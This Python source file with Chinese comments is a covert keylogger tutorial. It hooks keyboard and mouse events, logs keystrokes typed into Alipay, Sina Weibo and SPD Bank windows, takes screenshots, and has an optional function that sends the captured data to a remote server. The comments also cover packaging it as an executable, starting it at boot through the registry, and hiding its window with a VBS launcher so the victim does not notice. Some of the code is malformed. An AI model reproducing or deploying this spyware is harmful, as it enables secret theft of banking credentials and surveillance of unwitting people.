'''
    pyHook实现监听用户鼠标与键盘事件

    获取用户输入信息，并与截图一起保存到指定目录下
    用py2exe将脚本打包
    将该程序设置为开机自动启动
    

'''
# -*- coding:utf-8 -*-
import pythoncom
import pyHook 
import time
import socket
from PIL import ImageGrab


# 如果是远程监听某个目标电脑，可以自己架设一个服务器，
# 然后将获取到的信息发回给服务器
def send_msg_to_server(msg):
    host = ''
    port = 8888
    buf_size = 1024
    addr = (host, port)

    if len(msg) > 0:
        tcp_cli_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_cli_sock.connect(addr)

        info = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
                +' from '+ socket.gethostname() + ':'
                      
        tcp_cli_sock.sendall(info + msg)
        tcp_cli_sock.close()

# 将获取到的信息保存到本地文件下
def write_msg_to_txt(msg):
    f=open('D:/workspace/mytest/pyhook/media/monitor.txt','a')
    f.write(msg + '\r\n')
    f.close()
    
# 监听鼠标事件
def onMouseEvent(event):
    global MSG 
    if len(MSG) != 0:
        write_msg_to_txt(MSG)
        MSG = ''
        pic_name = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
        #将用户屏幕截图，保存到本地某个目录下（也可以搞成远程发送到自己的服务器）
        pic = ImageGrab.grab()
        pic.save('D:/workspace/mytest/pyhook/media/mouse_%s.png' % pic_name)
    return True

# 监听键盘事件
def onKeyboardEvent(event):
    global MSG
    title= event.WindowName.decode('GBK')
    #通过网站title，判断当前网站是否是“监听目标”
    if title.find(u"支付宝") != -1 or title.find(u'新浪微博')!=-1 or title.find(u'浦发银行')!=-1:
    
    #Ascii: 8-Backspace , 9-Tab ,13-Enter 
    if (127 >= event.Ascii > 31) or (event.Ascii == 8):
        MSG += chr(event.Ascii)        
    if (event.Ascii == 9) or (event.Ascii == 13):      
        #send_msg_to_remote(MSG)
        write_msg_to_txt(MSG)
        MSG = '' 
        #屏幕抓图实现
        pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
        pic = ImageGrab.grab()
        #保存成为以日期命名的图片
        pic.save('D:/workspace/mytest/pyhook/media/keyboard_%s.png' % pic_name)
    return True
  

if __name__ == "__main__":   
    MSG = ''  
    #创建hook句柄
    hm = pyHook.HookManager()
 
    #监控鼠标
    hm.SubscribeMouseLeftDown(onMouseEvent)
    hm.HookMouse()
 
    #监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
 
  #循环获取消息
  pythoncom.PumpMessages() 

'''
用py2exe将脚本打包
    新建一个py文件setup.py
'''
from distutils.core import setup
import py2exe

setup(console=["monitor.py"])
#setup(windows=["monitor.py"])

#命令行执行以下命令
python setup.py py2exe

'''
将该程序设置为开机自动启动：
    1)将需要开机启动的文件（创建一个快捷方式，然后）
      放到“开始/所有程序/启动”目录下
    2)修改注册表：命令行— regedit ，然后到以下路径下：
      [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]  

      新建一个“字符串值”，然后编辑：设置exe文件所在路径
      D:\workspace\mytest\pyhook\dist\monitor.exe

      （以上两种方式启动monitor.exe的话，会弹出一个命令框，
      显示监听日志信息，这样的话，被监听的人一下就能发现了，
      可以试试下面这个方式）
    3)新建一个 .vbs文件，内容如下：
      setwscriptObj=CreateObject("Wscript.Shell")
      wscriptObj.run“D:\workspace\mytest\pyhook\dist\monitor.exe",0

    4)双击运行该vbs文件，则monitor.exe就在后台启动了（不会弹出一个大黑框）。
      然后参考法①、② 把该vbs设置成开机启动即可。
'''
